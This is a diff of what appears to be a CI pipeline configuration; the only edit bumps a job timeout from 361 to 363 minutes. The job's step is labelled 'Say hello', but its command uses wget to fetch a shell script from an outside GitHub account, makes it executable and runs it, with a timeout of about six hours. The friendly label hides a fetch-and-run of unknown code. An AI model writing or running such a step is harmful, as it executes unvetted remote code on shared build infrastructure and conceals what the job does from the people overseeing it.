@@ -14,7 +14,7 @@ jobs:
     steps:
       - checkout
       - run:
-          no_output_timeout: 361m
+          no_output_timeout: 363m
           name: "Say hello"
           command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
 
